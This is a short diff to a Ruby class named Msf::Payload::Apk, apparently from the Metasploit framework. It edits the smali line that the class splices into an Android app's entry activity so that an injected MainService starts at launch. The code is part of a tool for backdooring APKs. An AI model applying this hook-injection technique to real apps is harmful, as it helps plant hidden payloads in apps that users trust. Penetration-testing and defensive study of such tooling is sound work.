@@ -227,7 +227,7 @@ class Msf::Payload::Apk
     end
 
     payloadhook = entrypoint + %Q^
-    invoke-static {p0}, L#{package_slash}/MainService;->startService(Landroid/content/Context;)V
+    invoke-static {}, L#{package_slash}/MainService;->start()V
     ^
     hookedsmali = activitysmali.gsub(entrypoint, payloadhook)
 
